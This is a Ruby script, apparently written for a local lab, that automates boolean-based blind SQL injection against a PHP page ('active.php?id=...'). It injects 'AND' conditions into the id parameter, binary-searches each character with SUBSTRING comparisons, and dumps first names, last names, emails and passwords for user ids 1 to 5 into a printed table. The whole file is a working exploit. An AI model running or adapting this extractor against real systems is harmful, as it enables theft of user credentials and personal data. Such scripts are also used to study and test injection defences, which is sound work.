require 'open-uri'
require 'pp'
require_relative './uri_encode_component'

USER_ID = ARGV[0] || 1

def guess_val min = 0, max = nil
    current_min, current_max = fast_min_max_val(min,max){|val| yield val}
    # puts "#{current_min} #{current_max}"
    loop do
        max_to_compare = (current_max - current_min)/2 + current_min
        is_smaller_than = yield max_to_compare
        if is_smaller_than
            current_max = max_to_compare
        else
            current_min = max_to_compare
        end
        break if current_max - current_min <=1
    end
    current_min
end

def fast_min_max_val current_min = 0, max = nil
    current_max = current_min+1
    loop do
        break if max && current_max >= max
        break if yield current_max
        current_min = current_max
        current_max*=2
    end
    return current_min, current_max
end
@request_count = 0

def request_val user_id, condition
    @request_count+=1;
    # puts 'sql req: ' + id_sql_val
    res = URI.open("http://localhost:1234/active.php?id=#{user_id} AND #{encodeURIComponent(condition)}").read
    return nil if res.include? 'error'
    (res.include? 'is active') || (res.include? 'suspended')
end

SQL_ESCAPE_CHARS = '\\\''
MIN_TABLE_CHAR = 31
def guess_field(user_id, table_field)
    current_value = ""
    for char_pos in 1.. do
        char_index = guess_val(MIN_TABLE_CHAR) do |char_comp|
            char = char_comp.chr(Encoding::UTF_8)
            escaped_char = (SQL_ESCAPE_CHARS.include? char)?('\\' + char) : char
            print "\r#{current_value}#{char.sub(/[^[:print:]]/, ' ')}"; #visual
            request_val user_id, "SUBSTRING(#{table_field}, #{char_pos}) < BINARY '#{escaped_char}'"
        end
        break if char_index <= MIN_TABLE_CHAR
        current_value += char_index.chr(Encoding::UTF_8)
    end
    current_value
end

def display_table lines, headers
    lines.unshift headers if headers
    #col widths
    col_widths = lines.first.each_with_index.map do |_, col_ind|
        lines.reduce(0){|acc, line| ((line[col_ind].length > acc) ? line[col_ind].length : acc)} + 1
    end
    width = col_widths.reduce(1){|acc, col_length| acc + col_length + 2}
    #display
    lines.each do |line|
        puts '-'*width
        line.each_with_index do |content, ind|
            print '|'
            print ' ' + "%-#{col_widths[ind]}.#{col_widths[ind]}s" % content
        end
        puts '|'
    end
    puts '-'*width
end

#exec
USER_IDS = (1..5)
TABLE_FIELDS = ['firstname', 'lastname', 'email', 'password']

dump_data = USER_IDS.each_with_index.map do |user_id, user_ind|
    TABLE_FIELDS.each_with_index.map do |table_field, field_ind|
        puts
        puts "#{user_ind * TABLE_FIELDS.length + field_ind + 1} of #{USER_IDS.count * TABLE_FIELDS.length}"
        guess_field user_id, table_field
    end
end
puts
display_table dump_data, TABLE_FIELDS

puts "with #{@request_count} requests";